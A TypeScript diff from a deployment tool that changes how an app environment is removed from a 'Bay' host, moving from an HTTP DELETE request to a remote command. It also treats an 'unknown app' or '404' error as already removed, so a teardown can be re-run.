     await run({
       name: `remove ${ctx.project}/${ctx.env}`,
       handler: async () => {
-        const res = await fetch(
-          `${endpoint}/api/bay/apps/${ctx.project}/${ctx.env}`,
-          { method: "DELETE", headers: { authorization: `Bearer ${key}` } },
-        );
-        if (!res.ok && res.status !== 404) {
-          throw new AlephaError(
-            `Bay refused the removal (${res.status}): ${this.reason(await res.text())}`,
+        try {
+          await this.remote(
+            ctx,
+            this.bayArgv(ctx, ["remove", `${ctx.project}/${ctx.env}`]),
           );
+        } catch (error) {
+          const detail = String(
+            (error as { stderr?: string })?.stderr ||
+              (error as Error)?.message ||
+              error,
+          );
+          // Already gone is the outcome `down` asked for. Failing here would
+          // make a re-run of a partly-finished teardown impossible. Both
+          // patterns are word-bounded: Bay echoes the app name back in some
+          // errors, and an app legitimately named e.g. "app404" must not have
+          // an unrelated failure read as "already removed" just because its
+          // own name contains "404".
+          if (!/\bunknown app\b|\b404\b/i.test(detail)) {
+            throw this.explain(host, error);
+          }
+          this.log.info(
+            `${ctx.project}/${ctx.env} was not deployed on ${host}. Nothing to remove.`,
+          );
+          return;
         }
         this.log.info(
-          `Removed ${ctx.project}/${ctx.env}. Its database and uploads are kept on the host.`,
+          `Removed ${ctx.project}/${ctx.env} from ${host}. Its database and uploads are kept on the host.`,
         );
       },
     });
-  }
-
-  /**
-   * Pulls a field out of a JSON body, falling back to the raw text.
-   *
-   * Bay answers Alepha's error shape, so `message` is the operator-facing
-   * sentence. A body that is not JSON at all usually means something in front of
-   * Bay answered instead — a proxy error page — and showing it verbatim is more
-   * useful than "unexpected token <".
-   */
-  protected reason(text: string, field = "message"): string {
-    try {
-      const parsed = JSON.parse(text);
-      return parsed?.[field] ?? text;
-    } catch {
-      return text.slice(0, 300);
-    }
   }
 }
